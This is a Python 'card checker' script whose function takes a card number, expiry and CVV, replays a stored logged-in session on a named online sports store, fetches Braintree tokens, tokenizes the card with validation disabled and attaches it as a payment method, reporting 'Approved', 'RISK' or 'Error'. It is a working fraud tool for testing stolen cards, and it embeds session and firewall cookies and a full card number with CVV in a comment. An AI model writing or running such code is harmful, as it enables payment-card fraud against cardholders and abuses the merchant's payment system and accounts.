def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	





	cookies = {
    'wffn_traffic_source': 'https://www.google.com/',
    'wffn_flt': '2024-7-7 23:40:38',
    'wffn_timezone': 'Africa/Cairo',
    'wffn_is_mobile': 'true',
    'wffn_browser': 'Chrome',
    'wffn_referrer': 'https://www.google.com/',
    'wffn_fl_url': '/privacy-policy/',
    '_ga': 'GA1.1.1641515761.1720417240',
    '_gcl_au': '1.1.1296404797.1720417240',
    '_fbp': 'fb.1.1720417240453.757916464664381020',
    'omnisendContactID': '668b7be25aac913d5ce0b612',
    'omnisend-form-65a6b96077ab435bd118c772-closed-at': '2024-07-08T05:40:53.208Z',
    'wordpress_logged_in_13e414371e5f1c2d9a0d5bf21c737d33': 'moh5527vbnm%7C1721626881%7C24RAVoy1jqkreXDBwVzg9rvdcWkqsdTHRAuOExygIi5%7Cd14420ce6c924341265a7747d30fe8382d475eca540239a155fcb9adb36fdcb2',
    'wfwaf-authcookie-e3884509b68293414f1439a8c4f61fd5': '44165%7Cother%7Cread%7C90226068eb0bab5afd31c0583c12e2ac106ed1bd428403d6a0b72a54414d82c0',
    'soundestID': '20240708205751-rwB8bWicuWBS4fs8owhaORXunimUg9vtyKDUR7GiQiUbxSxZZ',
    'omnisendSessionID': 'Qe8Igwl7SDA44A-20240708205751',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-07-08%2020%3A57%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-07-08%2020%3A57%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_CYYECGMPHQ': 'GS1.1.1720472274.3.0.1720472274.60.0.0',
    'page-views': '1',
    'fkcart_cart_qty': '0',
    'fkcart_cart_total': '%3Cspan%20class%3D%22woocommerce-Price-amount%20amount%22%3E%3Cbdi%3E%3Cspan%20class%3D%22woocommerce-Price-currencySymbol%22%3E%26%2336%3B%3C%2Fspan%3E0.00%3C%2Fbdi%3E%3C%2Fspan%3E',
}

	headers = {
    'authority': 'efxsports.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    # 'cookie': 'wffn_traffic_source=https://www.google.com/; wffn_flt=2024-7-7 23:40:38; wffn_timezone=Africa/Cairo; wffn_is_mobile=true; wffn_browser=Chrome; wffn_referrer=https://www.google.com/; wffn_fl_url=/privacy-policy/; _ga=GA1.1.1641515761.1720417240; _gcl_au=1.1.1296404797.1720417240; _fbp=fb.1.1720417240453.757916464664381020; omnisendContactID=668b7be25aac913d5ce0b612; omnisend-form-65a6b96077ab435bd118c772-closed-at=2024-07-08T05:40:53.208Z; wordpress_logged_in_13e414371e5f1c2d9a0d5bf21c737d33=moh5527vbnm%7C1721626881%7C24RAVoy1jqkreXDBwVzg9rvdcWkqsdTHRAuOExygIi5%7Cd14420ce6c924341265a7747d30fe8382d475eca540239a155fcb9adb36fdcb2; wfwaf-authcookie-e3884509b68293414f1439a8c4f61fd5=44165%7Cother%7Cread%7C90226068eb0bab5afd31c0583c12e2ac106ed1bd428403d6a0b72a54414d82c0; soundestID=20240708205751-rwB8bWicuWBS4fs8owhaORXunimUg9vtyKDUR7GiQiUbxSxZZ; omnisendSessionID=Qe8Igwl7SDA44A-20240708205751; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-08%2020%3A57%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-08%2020%3A57%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F; _ga_CYYECGMPHQ=GS1.1.1720472274.3.0.1720472274.60.0.0; page-views=1; fkcart_cart_qty=0; fkcart_cart_total=%3Cspan%20class%3D%22woocommerce-Price-amount%20amount%22%3E%3Cbdi%3E%3Cspan%20class%3D%22woocommerce-Price-currencySymbol%22%3E%26%2336%3B%3C%2Fspan%3E0.00%3C%2Fbdi%3E%3C%2Fspan%3E',
    'pragma': 'no-cache',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	response = requests.get('https://efxsports.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
	
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	
	client_token_nonce = re.search(r'"client_token_nonce":"(.*?)"', response.text).group(1)
	



	headers = {
    'authority': 'efxsports.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://efxsports.com',
    'pragma': 'no-cache',
    'referer': 'https://efxsports.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

	data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': client_token_nonce,
}

	response = requests.post('https://efxsports.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	
	
	
	enc = response.json()['data']
	
	dec = base64.b64decode(enc).decode('utf-8')
	
	au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
	
	
	


	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '2ee1f2ca-1594-43ca-949b-bbf5df83b12f',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"2ee1f2ca-1594-43ca-949b-bbf5df83b12f"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5115581818109910","expirationMonth":"06","expirationYear":"2025","cvv":"291"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	tok = response.json()['data']['tokenizeCreditCard']['token']















	cookies = {
    'wffn_traffic_source': 'https://www.google.com/',
    'wffn_flt': '2024-7-7 23:40:38',
    'wffn_timezone': 'Africa/Cairo',
    'wffn_is_mobile': 'true',
    'wffn_browser': 'Chrome',
    'wffn_referrer': 'https://www.google.com/',
    'wffn_fl_url': '/privacy-policy/',
    '_ga': 'GA1.1.1641515761.1720417240',
    '_gcl_au': '1.1.1296404797.1720417240',
    '_fbp': 'fb.1.1720417240453.757916464664381020',
    'omnisendContactID': '668b7be25aac913d5ce0b612',
    'omnisend-form-65a6b96077ab435bd118c772-closed-at': '2024-07-08T05:40:53.208Z',
    'wordpress_logged_in_13e414371e5f1c2d9a0d5bf21c737d33': 'moh5527vbnm%7C1721626881%7C24RAVoy1jqkreXDBwVzg9rvdcWkqsdTHRAuOExygIi5%7Cd14420ce6c924341265a7747d30fe8382d475eca540239a155fcb9adb36fdcb2',
    'wfwaf-authcookie-e3884509b68293414f1439a8c4f61fd5': '44165%7Cother%7Cread%7C90226068eb0bab5afd31c0583c12e2ac106ed1bd428403d6a0b72a54414d82c0',
    'soundestID': '20240708185348-7mVVrmME6qkenWAFI3yldCpLkcMwhJ5d88RAVty4oTuT8gPnW',
    'omnisendSessionID': 'wo6qsih5AZouAU-20240708185348',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-07-08%2018%3A53%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-07-08%2018%3A53%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F',
    'page-views': '1',
    'fkcart_cart_qty': '0',
    'fkcart_cart_total': '%3Cspan%20class%3D%22woocommerce-Price-amount%20amount%22%3E%3Cbdi%3E%3Cspan%20class%3D%22woocommerce-Price-currencySymbol%22%3E%26%2336%3B%3C%2Fspan%3E0.00%3C%2Fbdi%3E%3C%2Fspan%3E',
    '_ga_CYYECGMPHQ': 'GS1.1.1720464831.2.1.1720464860.31.0.0',
}

	headers = {
    'authority': 'efxsports.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'wffn_traffic_source=https://www.google.com/; wffn_flt=2024-7-7 23:40:38; wffn_timezone=Africa/Cairo; wffn_is_mobile=true; wffn_browser=Chrome; wffn_referrer=https://www.google.com/; wffn_fl_url=/privacy-policy/; _ga=GA1.1.1641515761.1720417240; _gcl_au=1.1.1296404797.1720417240; _fbp=fb.1.1720417240453.757916464664381020; omnisendContactID=668b7be25aac913d5ce0b612; omnisend-form-65a6b96077ab435bd118c772-closed-at=2024-07-08T05:40:53.208Z; wordpress_logged_in_13e414371e5f1c2d9a0d5bf21c737d33=moh5527vbnm%7C1721626881%7C24RAVoy1jqkreXDBwVzg9rvdcWkqsdTHRAuOExygIi5%7Cd14420ce6c924341265a7747d30fe8382d475eca540239a155fcb9adb36fdcb2; wfwaf-authcookie-e3884509b68293414f1439a8c4f61fd5=44165%7Cother%7Cread%7C90226068eb0bab5afd31c0583c12e2ac106ed1bd428403d6a0b72a54414d82c0; soundestID=20240708185348-7mVVrmME6qkenWAFI3yldCpLkcMwhJ5d88RAVty4oTuT8gPnW; omnisendSessionID=wo6qsih5AZouAU-20240708185348; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-08%2018%3A53%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-08%2018%3A53%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F; page-views=1; fkcart_cart_qty=0; fkcart_cart_total=%3Cspan%20class%3D%22woocommerce-Price-amount%20amount%22%3E%3Cbdi%3E%3Cspan%20class%3D%22woocommerce-Price-currencySymbol%22%3E%26%2336%3B%3C%2Fspan%3E0.00%3C%2Fbdi%3E%3C%2Fspan%3E; _ga_CYYECGMPHQ=GS1.1.1720464831.2.1.1720464860.31.0.0',
    'origin': 'https://efxsports.com',
    'pragma': 'no-cache',
    'referer': 'https://efxsports.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = [
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'master-card'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', tok,),
    ('wc_braintree_device_data', '{"correlation_id":"a52da303a231c5c3d9911ac0277b3074"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"a52da303a231c5c3d9911ac0277b3074"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'USD'),
    ('wc_braintree_paypal_locale', 'en_us'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce',add_nonce,),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
]

	response = requests.post('https://efxsports.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
	pattern = r'Status code (.*?)\s*</li>'
    
	text = response.text
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
